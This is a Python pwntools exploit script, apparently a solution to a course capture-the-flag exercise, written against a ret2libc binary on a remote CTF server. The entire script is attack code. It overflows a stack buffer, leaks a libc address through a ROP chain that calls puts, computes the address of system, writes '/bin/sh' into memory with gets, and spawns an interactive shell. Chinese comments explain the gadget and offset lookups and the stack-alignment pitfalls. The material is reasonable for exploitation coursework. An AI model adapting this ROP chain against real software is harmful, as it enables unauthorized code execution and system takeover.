#coding=utf-8
from pwn import *

context.binary = './ret2libc'
puts = 0x400520
gets = 0x400530
main = 0x400698
ret = 0x400506
# 用 objdump -R $binary 可以得到 plt
libc_start_main = 0x600ff0

# pop rdi ; ret
pop_rdi = 0x400733

payload = flat('a' * 0x38,
               pop_rdi,
               libc_start_main,
               puts,
               main
              )
#r = process('./ret2libc')
r = remote('edu-ctf.csie.org', 10175)
#raw_input('wait')
r.recvuntil('Say hello to stack :D')
r.sendline(payload)
r.recvline()
# 小心換行字元，還有 \0 不會印出來，所以要自己打
base = u64(r.recvuntil('Say hello to stack :D')[:6] + '\0\0')
print hex(base)

# 可以用 pwntools 的 ELF 或是 readelf -s $libc 來取得 offset
system = 324672
libc_start_main_addr = 137904 
sh = 0x1b3e9a

# 如果要用直接拿 libc 的 /bin/sh 要小心 16 字元對齊，要補個 return，用到 system 要注意!
payload = flat(
  'a' * 0x38,
  pop_rdi,
  #sh - libc_start_main_addr + base,
  0x601000,
  gets,
  pop_rdi,
  0x601000,
  #ret,
  system - libc_start_main_addr + base
)
r.sendline(payload)
r.sendline('/bin/sh\0')
r.interactive()
